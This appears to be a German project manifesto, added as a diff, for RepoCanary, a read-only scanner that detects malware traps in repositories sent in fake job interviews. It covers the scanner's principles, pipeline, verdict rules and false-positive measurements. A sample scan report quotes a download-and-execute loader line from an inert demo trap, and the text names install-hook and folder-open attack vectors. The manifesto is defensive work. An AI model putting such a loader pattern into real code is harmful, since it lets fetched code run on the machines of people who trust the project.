@@ -1,0 +1,385 @@
+<!-- COVER -->
+<section class="cover">
+  <div class="cover-strata"><span></span><span></span><span></span><span></span></div>
+  <div class="cover-in">
+    <div class="cover-brand">{{LOGO:34}}<span>RepoCanary</span></div>
+    <div class="cover-mid">
+      <div class="kicker">Manifest</div>
+      <h1>Lesen, nie ausführen. Ehrlich urteilen. Grenzen offenlegen.</h1>
+      <p class="thesis">RepoCanary prüft ein GitHub-Repository auf die bekannten Signaturen von Schadcode aus gefälschten Bewerbungsgesprächen, ohne je eine Zeile davon auszuführen. Dieses Manifest sagt, woran das Projekt glaubt, wie es gebaut ist, was es heute kann und wo es aufhört.</p>
+    </div>
+    <div class="cover-big">{{LOGO:210}}</div>
+    <div class="toc">
+      <div class="toc-h">Inhalt</div>
+      <ol>
+        <li><span>Was wir glauben</span><b>2</b></li>
+        <li><span>Das Problem</span><b>5</b></li>
+        <li><span>Die Idee</span><b>6</b></li>
+        <li><span>Wie ein Scan läuft</span><b>7</b></li>
+        <li><span>Was es erkennt</span><b>9</b></li>
+        <li><span>Das Urteil</span><b>10</b></li>
+        <li><span>Drei Oberflächen, eine Engine</span><b>12</b></li>
+        <li><span>Was es heute kann</span><b>13</b></li>
+        <li><span>Gemessen</span><b>14</b></li>
+        <li><span>Sicherheit und Datenschutz</span><b>16</b></li>
+        <li><span>Wie es gebaut wird</span><b>17</b></li>
+        <li><span>Grenzen heute</span><b>19</b></li>
+      </ol>
+    </div>
+    <div class="cover-foot"><span>Chris Zemmel (Zyric)</span><span>repocanary.com</span></div>
+  </div>
+</section>
+
+<!-- 01 -->
+<section class="sec pb" id="glauben">
+  <div class="num">01</div>
+  <h2>Was wir glauben</h2>
+  <p class="lead">Wer ein fremdes Repository ausführen soll, hat meist ein paar Minuten und kein Werkzeug dafür. RepoCanary gibt dieser Person eine schnelle, kostenlose und ehrliche Einschätzung. Das Projekt folgt sieben Grundsätzen. Jeder ist im Code umgesetzt, und hinter jedem steht ein echter Fall.</p>
+
+  <div class="kpis">
+    <div class="kpi"><b>27.&nbsp;Sept. 2026</b><span>erste Version auf npm und öffentlich auf GitHub</span></div>
+    <div class="kpi"><b>100+</b><span>dokumentierte Angriffstechniken, jede im Katalog erkannt</span></div>
+    <div class="kpi"><b>90+</b><span>Erkennungsregeln, die der Katalog auslöst</span></div>
+    <div class="kpi"><b>750+</b><span>automatische Tests, offline, ohne Installation</span></div>
+    <div class="kpi"><b>4.000+</b><span>Repositories gemessen, die die Regeln nie gesehen hatten</span></div>
+    <div class="kpi"><b>0</b><span>Laufzeit-Abhängigkeiten und 0 Zeilen des Ziels je ausgeführt</span></div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">1</div>
+    <div>
+      <h3>Lesen, nie ausführen</h3>
+      <p class="stmt">RepoCanary klont, installiert, startet, wertet und importiert das geprüfte Repository nie. Es liest Dateien als Text und vergleicht Muster.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Ein Werkzeug, das fremden Code zum Prüfen ausführt, wäre selbst der Angriff. Wer RepoCanary auf Schadcode richtet, darf dabei nicht mehr riskieren als beim Lesen im Browser.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Ein Test bricht den Build, sobald der Code der Engine <code>child_process</code> importiert, <code>eval</code> nutzt oder einen anderen Host anspricht als die GitHub-API und, nur auf Wunsch, einen KI-Anbieter (<code>test/invariants.test.js</code>). Als die Dokumentation „nie heruntergeladen“ versprach, wurde sie korrigiert: Dateien werden zum Prüfen in den Speicher gelesen, aber nie ausgeführt oder gespeichert.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">2</div>
+    <div>
+      <h3>Grün heißt nicht sicher</h3>
+      <p class="stmt">Ein grünes Urteil sagt „nichts Bekanntes gefunden“ und nie mehr. Ein Scan, der nicht fertig wurde, gibt sich nie als einer aus, der nichts gefunden hat.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Falsche Entwarnung ist das teuerste Ergebnis, das ein solches Werkzeug liefern kann. Wer „sicher“ liest, führt aus. Eine Prüfung, die nicht hinsehen konnte, darf nicht so aussehen wie eine, die nichts fand.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Der Satz für Grün steht an einer Stelle im Code und wird überall wörtlich verwendet. Ein Test prüft, dass er ausdrücklich sagt: kein Beweis für Sicherheit. Ein unvollständiger Scan endet mit Exit-Code&nbsp;3, schreibt trotzdem ein JSON- oder SARIF-Dokument mit dem Urteil „error“ und lässt die GitHub Action bei jeder Einstellung scheitern.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">3</div>
+    <div>
+      <h3>Rot muss man glauben können</h3>
+      <p class="stmt">Rot bleibt dem Muster einer Falle vorbehalten. Was unsicher ist, wird Gelb. Wie oft Rot ein ehrliches Projekt trifft, wird auf fremdem Code gemessen, nicht geschätzt.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Eine Warnung, die auf ehrliche Projekte feuert, bringt Menschen bei, sie zu überspringen. Dann ist auch das echte Rot wertlos.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>In der ersten Messwelle waren rund 13&nbsp;Prozent der roten Urteile falsch. Jeder Fehler wurde mit einem allgemeinen Grundsatz behoben, nie mit einer Ausnahme: Rot braucht etwas, das von selbst läuft. Ein Text ist kein Befehl, solange er keine Shell erreicht. Eine Erwähnung ist keine Handlung (Kapitel&nbsp;9).</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">4</div>
+    <div>
+      <h3>Die Grenzen stehen im Repository</h3>
+      <p class="stmt">Was RepoCanary nicht erkennt, steht im Bedrohungsmodell. Die wichtigsten Grenzen liegen als Beispiele bei, die weiter unerkannt bleiben müssen.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Ein Sicherheitswerkzeug, das seine Grenzen verschweigt, täuscht gerade die Menschen, die die Wahrheit am dringendsten brauchen.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Sechs dokumentierte Grenzen liegen als ausführbare Beispiele bei, und die Messung prüft, dass sie weiter durchrutschen: Eine Grenze, die sich still verschiebt, fällt auf. RepoCanary meldet sein eigenes Repository als Rot, weil es seine Signaturen enthalten muss. Eine Ausnahme dafür wäre ein Weg zum Umgehen, also gibt es keine.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">5</div>
+    <div>
+      <h3>Ein Modell entscheidet nie über Rot</h3>
+      <p class="stmt">Eine KI-Zweitmeinung ist möglich, aber nur auf Wunsch und mit dem eigenen Schlüssel. Sie darf ein Gelb freigeben oder ein Grün anheben. Ein Rot senken oder erzeugen darf sie nie.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Rot heißt: Eine Signatur hat gefeuert. Die Meinung eines Modells ist keine Signatur. Und Modelle lehnen Fragen zu Schadcode oft ab, das Urteil darf daran nicht hängen.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Die Grenze steht im Code, der das Urteil zusammenführt, nicht im Prompt, und Tests halten sie fest. Lehnt ein Anbieter ab oder fällt aus, kommt der nächste dran, danach gilt das statische Urteil. Als die KI die Länge der gekürzten Befundliste statt der wahren Zahl erhielt, wurde das korrigiert.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">6</div>
+    <div>
+      <h3>Feindliche Eingaben sind der Normalfall</h3>
+      <p class="stmt">Was RepoCanary liest, hat oft ein Angreifer geschrieben. Jede Regel muss präparierte Dateien aushalten, ohne zu hängen, abzustürzen oder die Ausgabe fälschen zu lassen.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Ein Scanner, den eine einzige präparierte Datei lahmlegt oder zu einem leeren Bericht bringt, liefert genau dann nichts, wenn es darauf ankommt.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Jede Regel ist auf linearen Aufwand festgelegt, gemessen an feindlich gebauten Dateien in der größten zugelassenen Größe. Scheitert eine Regel dennoch, kostet das nur die Befunde dieser Datei. Steuer- und Richtungszeichen werden vor der Ausgabe entschärft, damit kein Repository das Terminal täuschen kann.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">7</div>
+    <div>
+      <h3>Offen und kostenlos</h3>
+      <p class="stmt">Code und Regeln sind unter MIT-Lizenz öffentlich. Es gibt kein Konto, keine Telemetrie und keine Bezahlstufe.</p>
+      <div class="pr-cols">
+        <div><div class="label">Warum</div><p>Die Person, für die RepoCanary gedacht ist, kann sich keinen Scanner kaufen. Und einem Sicherheitswerkzeug, das niemand prüfen kann, sollte niemand vertrauen.</p></div>
+        <div class="pr-case"><div class="label">Der Fall</div><p>Die Kommandozeile hat keine Laufzeit-Abhängigkeiten, ein Lint-Schritt erzwingt das. Das npm-Paket wird über Trusted Publishing mit Herkunftsnachweis veröffentlicht. Ein Token zum Veröffentlichen gibt es nirgends.</p></div>
+      </div>
+    </div>
+  </div>
+  <div class="triad">
+    <div class="t-bad"><h4>{{I:triangle-alert}} Rot</h4><p>Eine Signatur hoher Schwere passt. Nicht ausführen, nicht installieren, nicht in einem Editor öffnen, der Aufgaben selbst startet.</p></div>
+    <div class="t-na"><h4>{{I:eye}} Gelb</h4><p>Etwas sieht verdächtig aus, hat aber in manchen Projekten eine ehrliche Erklärung. Erst jemanden die genannten Zeilen lesen lassen.</p></div>
+    <div class="t-ok"><h4>{{I:circle-check}} Grün</h4><p>Nichts Bekanntes passt. Das senkt das Risiko, beweist aber keine Sicherheit, und der Bericht sagt das.</p></div>
+  </div>
+
+</section>
+
+<!-- 02 -->
+<section class="sec pb" id="problem">
+  <div class="num">02</div>
+  <h2>Das Problem</h2>
+  <p class="lead">Jemand schickt ein Repository und bittet darum, es auszuführen oder nur zu öffnen: ein Recruiter mit einer Probeaufgabe, ein „Kunde“, jemand, der eine zweite Meinung möchte. Der Schadcode sitzt dort, wo er läuft, bevor man etwas gelesen hat.</p>
+  {{FIG:attack|Abb. 1|Der Angriff. Ein Repository kommt mit der Bitte, es auszuführen. Ob über die Installation, das Öffnen des Ordners oder den ersten Start: Der Schadcode läuft, bevor jemand den Code gelesen hat, und stiehlt, was auf dem Rechner liegt.}}
+  <p>Kampagnen wie „Contagious Interview“, die staatlichen Akteuren aus Nordkorea zugeschrieben werden, haben das gegen Tausende Entwickler eingesetzt. Ihre Werkzeuge werden inzwischen von gewöhnlichen Kriminellen kopiert. Ein <code>postinstall</code>-Skript, eine verschleierte Konfigurationsdatei, ein manipulierter Eintrag in der Lockfile, oder ganz ohne Installation: ein VS-Code-Task, der beim Öffnen des Ordners startet, ein MCP-Server, den ein KI-Editor von selbst startet, ein Agent-Hook oder ein Dev-Container.</p>
+  <div class="three">
+    <div><h4>{{I:hourglass}} Läuft vor dem Lesen</h4><p>Die Falle sitzt in Install-Hooks und Autostarts. Wer erst lesen will, muss wissen, wo.</p></div>
+    <div><h4>{{I:folder-open}} Öffnen reicht</h4><p>Für manche Wege braucht es keinen Befehl. Den Ordner im Editor zu öffnen, um ihn anzusehen, ist schon der Angriff.</p></div>
+    <div><h4>{{I:file-search}} Code als Köder</h4><p>Der sichtbare Code ist oft harmlos. Er lädt nur nach, was erst zur Laufzeit kommt.</p></div>
+  </div>
+</section>
+
+<!-- 03 -->
+<section class="sec pb" id="idee">
+  <div class="num">03</div>
+  <h2>Die Idee</h2>
+  <p class="lead">RepoCanary prüft, bevor der Code den Editor oder das Terminal erreicht, und es liest nur. Wer es auf Schadcode richtet, setzt sich keinem größeren Risiko aus als beim Lesen der Dateien im Browser.</p>
+  {{FIG:safe|Abb. 2|Lesen, nie ausführen. RepoCanary holt den Dateibaum und ausgewählte Dateien als reinen Text über die GitHub-API. Nur auf Wunsch gehen Befunde an einen KI-Anbieter. Klonen, installieren, ausführen, auswerten und importieren gibt es im Code nicht, und ein Test bricht den Build, wenn sich das ändert.}}
+  <p>Aus dem Repository liest RepoCanary eine begrenzte Auswahl an Dateien. Jede Prüfung ist reiner Text- und Mustervergleich. Der geprüfte Link geht nur an <code>api.github.com</code> und wird nicht auf die Festplatte geschrieben. In der Praxis braucht die Kommandozeile ein eigenes GitHub-Token mit Lesezugriff auf öffentliche Repositories, weil GitHub anonyme Anfragen stark begrenzt.</p>
+  <p>Dasselbe Repository ergibt dieselben Bytes im Bericht, egal was vorher lief. Feste Referenzberichte im Repository halten das fest, Byte für Byte. Ein Urteil, das von Zufall oder Reihenfolge abhinge, ließe sich weder prüfen noch vergleichen.</p>
+  <div class="callout">
+    <div class="callout-h">{{I:shield-check}} Was RepoCanary ist und was nicht</div>
+    <p>Ein Rauchmelder, kein Schutzschild. Es erkennt die bekannte Form eines Angriffs in Dateien. Ein Repository, das seine Nutzlast erst zur Laufzeit von einem Server holt, kann grün durchgehen. Deshalb heißt Grün nie „sicher“ (Kapitel&nbsp;12).</p>
+  </div>
+</section>
+
+<!-- 04 -->
+<section class="sec pb" id="scan">
+  <div class="num">04</div>
+  <h2>Wie ein Scan läuft</h2>
+  <p class="lead">Ein Scan hat sieben Schritte. Die ersten vier entscheiden, was gelesen wird, die letzten drei, was es bedeutet.</p>
+  {{FIG:pipeline|Abb. 3|Sieben Schritte. Der Baum wird gelesen und nach Orten sortiert, an denen eine Falle liegen muss. Was eine Datei ausführen lässt, wird gezielt nachgeholt. Dann läuft jede Regel auf jeder Datei, die Schwere ergibt die Farbe, und der Bericht nennt zu jedem Befund Datei, Zeile, Grund und nächsten Schritt.}}
+  <h3>Auswählen und nachverfolgen</h3>
+  <p>Ein Repository kann groß sein, der Scan liest nicht alles. Deshalb kommt zuerst, was laufen muss, bevor jemand liest: Install-Hooks, Autostarts von Editor und Agenten, Lockfiles, Build-Skripte. Jede dieser Arten hat ein eigenes Kontingent, damit keine das ganze Budget aufbraucht. Gewöhnlicher Quellcode füllt den Rest.</p>
+  <p>Ein <code>postinstall</code>, das <code>node scripts/setup.js</code> startet, eine Kette von <code>npm run</code>, ein <code>bin</code>-Eintrag, ein VS-Code-Task: Was eine Datei ausführen lässt, wird mit einem eigenen, reservierten Budget nachgeholt. So kann ein großes Repository die eine Datei nicht verdrängen, an der das Urteil hängt. Wird eine Obergrenze erreicht, sagt der Bericht das als Hinweis.</p>
+  <h3>Der Bericht</h3>
+  <p>Jeder Befund nennt Datei und Zeile, erklärt in einfachen Worten, warum er zählt, und sagt, was als Nächstes zu tun ist. Ausschnitte werden vor der Ausgabe gekürzt, lange kodierte Folgen geschwärzt, damit keine funktionierende Nutzlast im Bericht landet.</p>
+  <div class="code-fig">
+<pre><code><span class="k">RepoCanary scan: some-recruiter/take-home-task (ref: main)</span>
+
+<span class="k">Verdict: RED</span>
+
+Danger: some-recruiter/take-home-task matches known malware-trap signatures.
+Do not run it.
+<span class="c">[…]</span>
+Scanned 6 files (1 KB). Findings: 3 high, 1 medium, 4 low.
+<span class="c">[…]</span>
+  2. <span class="n">[HIGH]</span> download-and-execute
+     <span class="s">server/config/initDatabase.js:6</span>
+     &gt; const { data } = await axios.get(src); new Function('require',
+     &gt; data)(require); await mongoose.connect(process.env.MONGO_URL ||
+     Why it matters: This code downloads something from the internet and runs
+     it as a program. That means the visible source is only stage one; the
+     real payload arrives at run time.
+     What to do: Do not run this repository. The fetched code can differ per
+     victim, so no review of the repo alone clears it.
+<span class="c">[…]</span>
+Exit code: 2 (0 green, 1 yellow, 2 red, 3 scan failed)</code></pre>
+    <figcaption><b>Abb. 4</b> Echte Ausgabe der Kommandozeile, gekürzt. Geprüft wurde das Beispiel einer Falle, das im Repository für die Bildschirmfotos liegt: eine Probeaufgabe, deren <code>postinstall</code> einen Nachlader startet. Ein VS-Code-Task startet ihn zusätzlich beim Öffnen des Ordners. Die Adresse des Nachladers endet auf <code>.invalid</code> und führt nirgends hin. Die Kommandozeile spricht Englisch.</figcaption>
+  </div>
+  {{PHONES:red,findings,green|Dieselbe Prüfung auf repocanary.com am Telefon: das Urteil und die Befunde mit Datei und Zeile. Die Seite ist die öffentliche Website, die Antwort auf die Scan-Anfrage aber die Offline-Prüfung desselben Beispiels durch die echte Engine, denn ein echtes bösartiges Repository soll hier nicht stehen. Rechts ein echter, vollständiger Scan des Beispiel-Repositorys, das die Website selbst anbietet: Grün, formuliert als „nichts Bekanntes gefunden“.}}
+</section>
+
+<!-- 05 -->
+<section class="sec pb" id="erkennt">
+  <div class="num">05</div>
+  <h2>Was es erkennt</h2>
+  <p class="lead">Der Katalog umfasst über 100 Techniken aus den Kampagnen und dem breiteren Werkzeugkasten von Angriffen über npm und PyPI, in neun Kategorien. Er ist gemessen, nicht behauptet.</p>
+  {{PHONE:coverage}}
+  <p>Jede Technik liegt als ganzes, glaubwürdiges Repository mit wirkungslosen Endpunkten bei. Ein Skript lässt die echte Engine über alle Beispiele laufen und schreibt auf, welche Regeln feuern und welches Urteil herauskommt. Daraus entstehen der Katalog im Repository und die Seite <code>/coverage</code> der Website. Die Prüfstrecke scheitert, wenn Katalog und Regeln auseinanderlaufen oder wenn eine Technik nicht mehr erkannt wird.</p>
+  <p>Vorbild sind die öffentlich beschriebenen Familien Contagious Interview, BeaverTail, InvisibleFerret und OtterCookie. Etwa zwei Drittel der Techniken ergeben Rot, der Rest Gelb, keine bleibt grün.</p>
+  <p>Dateien, die einem KI-Agenten Anweisungen geben, sind ein eigener Fall. RepoCanary erkennt die mechanischen Tricks darin, etwa versteckten Text, unsichtbare Tag-Zeichen oder einen Link, der ein Geheimnis mitnimmt. Eine Bitte in gewöhnlicher Sprache, die einen Agenten zu etwas Schädlichem bringen soll, kann es nicht beurteilen.</p>
+  <p>Eine VS-Code-Aufgabe, die beim Öffnen des Ordners startet, ist immer Rot, egal was sie startet: In einem fremden Repository ist schon das Öffnen zum Lesen der Angriff.</p>
+  {{FIG:categories|Abb. 5|Neun Kategorien, jede mit Beispielen. Kontextsignale wie ein brandneues Konto stehen gestrichelt: Sie können allein höchstens zu Gelb führen, nie zu Rot.}}
+  <p>Der Katalog ist eine Absicherung gegen Rückschritte, keine Erkennungsrate. Jede Regel braucht ein Beispiel, also deckt der Katalog per Bauart nur ab, was die Regeln ohnehin fangen. Eine ehrliche Erkennungsrate bräuchte Schadcode, den jemand anderes geschrieben hat, geprüft mit eingefrorenen Regeln. Die gibt es noch nicht, und das Repository sagt es selbst.</p>
+</section>
+
+<!-- 06 -->
+<section class="sec pb" id="urteil">
+  <div class="num">06</div>
+  <h2>Das Urteil</h2>
+  <p class="lead">Die statischen Regeln entscheiden das Urteil, und nichts sonst. Die Regeln dafür sind so einfach, dass jede in einen Satz passt.</p>
+  {{FIG:verdict|Abb. 6|Wie die Farbe entsteht, mit dem Exit-Code der Kommandozeile. Ein Scan, der nicht fertig wurde, endet mit Code&nbsp;3, nie mit Grün.}}
+  <p>Schwache Signale, die dieselbe Beobachtung beschreiben, zählen als eine: Eine minifizierte Bibliothek löst mehrere Regeln zu kodiertem Inhalt aus, ist aber nur eine Tatsache über das Projekt.</p>
+  <h3 class="clear">Die KI-Zweitmeinung</h3>
+  <p>Mit <code>--ai</code> gehen die Befunde an ein Sprachmodell, mit dem eigenen Schlüssel der Nutzer: Pfade, geschwärzte Ausschnitte, Gründe und öffentliche Daten des Repositorys, nichts vom eigenen Rechner. Vier Anbieter sind möglich, zwei mit kostenlosem Zugang. Ein Schlüssel wird nie als Argument angenommen und bleibt nur für den Lauf im Speicher.</p>
+  {{FIG:ai|Abb. 7|Was die KI darf: ein Grün zu Gelb anheben und ein Gelb freigeben, wenn jedes Signal eindeutig harmlos ist. Ein Rot senken oder erzeugen darf sie nie.}}
+</section>
+
+<!-- 07 -->
+<section class="sec pb" id="oberflaechen">
+  <div class="num">07</div>
+  <h2>Drei Oberflächen, eine Engine</h2>
+  <p class="lead">Kommandozeile, Website und GitHub Action führen denselben Detektor aus. Eine Regel verhält sich deshalb überall gleich.</p>
+  {{FIG:surfaces|Abb. 8|Eine Engine in reinem Node, ohne Laufzeit-Abhängigkeiten, dahinter vier Wege zum Urteil. Die Exit-Codes sind in Kommandozeile und Action dieselben, und Code&nbsp;3 ist nie ein Erfolg.}}
+  {{PHONE:home}}
+  <p><b>Kommandozeile.</b> <code>npx repocanary owner/repo</code> braucht keine Installation und kein Konto, nur Node. Die Ausgabe gibt es als Text, als versioniertes JSON und als SARIF für GitHub Code Scanning.</p>
+  <p><b>Website.</b> Wer kein Terminal nutzt, fügt auf repocanary.com den Link ein und liest dasselbe Ergebnis. Auch dort wird nichts aus dem Repository ausgeführt oder auf dem eigenen Rechner gespeichert. Die Seite braucht kein Konto, setzt keine Cookies und misst keine Besucher.</p>
+  <p><b>GitHub Action.</b> Ein Workflow kann ein Repository prüfen, bevor jemand im Team es ausführt, und den Schritt ab einem Urteil scheitern lassen. Das README rät, die Action über den vollen Commit-Hash einzubinden, nicht über ein Tag: Ein Tag lässt sich verschieben, und die Action läuft mit dem Token des eigenen Runners.</p>
+  <p><b>Badge.</b> Ein Projekt kann neben dem CI-Status zeigen, was RepoCanary über es sagt. Konnte der Scan nicht laufen, steht „unavailable“ da, nie ein grünes Abzeichen.</p>
+  <p>Wer die Website selbst betreiben will, braucht weder Datenbank noch Warteschlange, nur ein GitHub-Token.</p>
+</section>
+
+<!-- 08 -->
+<section class="sec pb" id="heute">
+  <div class="num">08</div>
+  <h2>Was es heute kann</h2>
+  <p class="lead">Jede Fähigkeit steht hier mit ihrem Stand. <span class="st live">{{I:circle-check}} in Betrieb</span> heißt: auf der Hauptlinie ausgeliefert und über npm oder repocanary.com nutzbar.</p>
+  <table class="tbl caps">
+    <tr><th>Bereich</th><th>Was es tut</th><th>Stand</th></tr>
+    <tr><td>Kommandozeile</td><td><code>npx repocanary</code>, ohne Installation und Konto, mit ehrlichen Exit-Codes von 0 bis 3.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Website</td><td>Link einfügen, prüfen, Ergebnis lesen, auch am Telefon, mit Beispiel-Scan zum Ausprobieren.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>GitHub Action</td><td>Prüfung im Workflow mit <code>fail-on</code>, SARIF-Datei und dem Urteil als Ausgabe.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Badge</td><td>Das Urteil als Abzeichen für ein README, „unavailable“ statt Grün, wenn nicht geprüft werden konnte.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Maschinenlesbar</td><td>JSON mit fester Schemaversion und SARIF&nbsp;2.1.0, auch für einen gescheiterten Scan.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Erkennung</td><td>Über 100 dokumentierte Techniken in neun Kategorien, über npm, Python, Rust, Go, JVM, PHP und Ruby.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Katalog</td><td>Jede Technik mit Urteil und auslösenden Regeln, aus der Engine erzeugt, im Repository und unter <code>/coverage</code>.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>KI-Zweitmeinung</td><td>Auf Wunsch, mit eigenem Schlüssel, bei vier Anbietern, ohne Macht über Rot.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Notfallanleitung</td><td>Was tun, wer schon ausgeführt hat: Schritte in fester Reihenfolge, jeweils mit Grund.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+    <tr><td>Selbst betreiben</td><td>Die Website aus dem Quellcode, ohne Datenbank und Warteschlange.</td><td><span class="st live">{{I:circle-check}} in Betrieb</span></td></tr>
+  </table>
+  <div class="callout ind">
+    <div class="callout-h">{{I:siren}} Schon ausgeführt?</div>
+    <p>Die Anleitung <code>WHAT-TO-DO-NOW.md</code> beginnt mit dem Schritt, der am meisten zählt: den Rechner vom Netz trennen. Danach Kryptowerte von einem anderen Gerät aus in eine neue Wallet bewegen, Tokens und Schlüssel widerrufen, Passwörter ändern, die E-Mail zuerst. Jeder Bericht verlinkt sie.</p>
+  </div>
+</section>
+
+<!-- 09 -->
+<section class="sec pb" id="gemessen">
+  <div class="num">09</div>
+  <h2>Gemessen</h2>
+  <p class="lead">Ein Scanner sieht auf dem Code gut aus, auf den er abgestimmt wurde. Gezählt hat deshalb die Messung auf Repositories, die vorher niemand geprüft hatte. Die Zahlen in diesem Kapitel stammen aus der Messung des Projekts bis zum 24.&nbsp;September 2026.</p>
+  <p>4.002 nie gesehene Repositories wurden in 29 Wellen geprüft. Jedes Rot einer Welle wurde geöffnet und gelesen, und die Regeln wurden für die Fehler korrigiert, bevor die nächste Welle gezogen wurde. Ab Welle&nbsp;16 wurde der Pool absichtlich schwerer: bekannte Projekte, Krypto- und Handelsbots, Werkzeuge für Coding-Agenten und die neuesten Repositories der großen Sprachen, die beruflich Dienste installieren und Installer in eine Shell leiten. Zugleich wurden die Regeln vor jeder Ziehung eingefroren.</p>
+  {{FIG:wrongreds|Abb. 9|Falsche Rote je Welle, in Prozent der Repositories. Auf breiten Ziehungen fiel der Anteil von 13&nbsp;Prozent auf unter 1&nbsp;Prozent bei 246 Probeaufgaben. Auf dem schwereren Pool mit eingefrorenen Regeln fiel er von 9&nbsp;Prozent auf 2,75&nbsp;Prozent (33 von 1.198 in den Wellen 24 bis 29). Werte aus der Projektdokumentation.}}
+  <p>Auf dem schweren Pool trifft Rot also etwa jedes 36. ehrliche Repository. Das ist die ehrliche Grenze eines Scanners, der Dateien liest und nichts ausführt. Viele dieser Rote sind nicht einmal falsch im engeren Sinn: Ehrliche Projekte tun manchmal genau, was der Angriff tut, etwa einen Installer aus einem Wurzel-Skript in eine Shell leiten oder einen Dienst einrichten, der beim Anmelden startet. Der Bericht sagt, was der Code tut. Ob das gewollt ist, entscheiden die Lesenden.</p>
+  <div class="case">
+    <div class="case-h"><div class="case-n">1</div><div><h3>Echte Fallen beim Messen</h3><p>Messung bis 24.&nbsp;September 2026</p></div></div>
+    <p>Beim Messen fand RepoCanary 19 echte Fallen in freier Wildbahn, 13 davon von einem einzigen Konto. Darunter ein verschleierter Nachlader, weit rechts außerhalb des sichtbaren Bereichs einer Zeile versteckt, die <code>npm start</code> ausführt, ein Handelsbot, der mit einem Verschleierungswerkzeug gebaut wurde, und ein Skript, das ausführt, was eine Adresse zurückgibt. Konten und Repositories nennt dieses Manifest nicht.</p>
+  </div>
+  <div class="case">
+    <div class="case-h"><div class="case-n">2</div><div><h3>Bekannte, schwierige Projekte</h3><p>Messung bis 24.&nbsp;September 2026</p></div></div>
+    <p>Auf 71 bekannten Projekten, ausgewählt, weil sie schwierig sind (native Erweiterungen, Paketmanager, Krypto-Bibliotheken, Build-Systeme), waren 53 grün und zwei rot, beide zu Recht: Eines installiert einen Dienst beim Systemstart, das andere leitet in seinem Dev-Container einen Installer in eine Shell.</p>
+  </div>
+  <div class="case">
+    <div class="case-h"><div class="case-n">3</div><div><h3>Regeln, die altern</h3><p>Wöchentlicher Korpuslauf</p></div></div>
+    <p>Ein Repository ändert sich, und eine Regel, die letzten Monat richtig lag, verurteilt es diesen Monat. Der wöchentliche Lauf gegen die echten Repositories hat laut seiner Beschreibung zwei solche Rückschritte gefunden. Kein festes Testbeispiel hätte sie zeigen können.</p>
+  </div>
+  {{FIG:corpus|Abb. 10|Der Regressionskorpus: 3.408 öffentliche Projekte, jede Woche neu gegen die echten Repositories geprüft. Nachdem die gelben Urteile Klasse für Klasse gelesen und die unnötigen behoben waren, sank Gelb von 25 auf 21&nbsp;Prozent. Jedes Rot im Korpus steht mit seinem Grund in einer Liste, und der wöchentliche Lauf scheitert an jedem Rot, das dort fehlt.}}
+  <div class="label" style="margin-top:6mm">Die Messung auf einen Blick, bis 24.&nbsp;September 2026</div>
+  <div class="kpis" style="margin-top:1mm">
+    <div class="kpi"><b>4.002</b><span>nie gesehene Repositories in 29 Wellen</span></div>
+    <div class="kpi"><b>2,75&nbsp;%</b><span>falsche Rote auf dem schweren Pool, Regeln eingefroren</span></div>
+    <div class="kpi"><b>3.408</b><span>Projekte im wöchentlich geprüften Korpus</span></div>
+    <div class="kpi"><b>101&nbsp;/&nbsp;101</b><span>dokumentierte Techniken erkannt, 69 rot, 32 gelb</span></div>
+    <div class="kpi"><b>6&nbsp;/&nbsp;6</b><span>dokumentierte Grenzen weiter unerkannt, wie beabsichtigt</span></div>
+    <div class="kpi"><b>19</b><span>echte Fallen beim Messen gefunden</span></div>
+  </div>
+</section>
+
+<!-- 10 -->
+<section class="sec pb" id="sicherheit">
+  <div class="num">10</div>
+  <h2>Sicherheit und Datenschutz</h2>
+  <p class="lead">Ein Scanner für feindliche Eingaben muss selbst feindlichen Eingaben standhalten. Und eine Sicherheitsaussage ist nur so viel wert wie das, was verhindert, dass sie sich still ändert.</p>
+  <table class="tbl">
+    <tr><th>Bereich</th><th>Umsetzung heute</th></tr>
+    <tr><td>Ausführung</td><td>Kein Klonen, kein Installieren, kein <code>eval</code>, kein <code>child_process</code>. Ein Test im Build hält das fest.</td></tr>
+    <tr><td>Netz</td><td>Nur <code>api.github.com</code> und, auf Wunsch, der gewählte KI-Anbieter. Auch das prüft ein Test.</td></tr>
+    <tr><td>Aufwand</td><td>Jede Regel mit linearem Aufwand, gemessen an Dateien, die zum Verlangsamen gebaut sind. Der schlimmste gemessene Fall lag bei 2,4&nbsp;Sekunden.</td></tr>
+    <tr><td>Ausgabe</td><td>Steuer- und Richtungszeichen werden entschärft, damit kein Repository die Anzeige im Terminal fälschen kann. Lange kodierte Folgen werden geschwärzt.</td></tr>
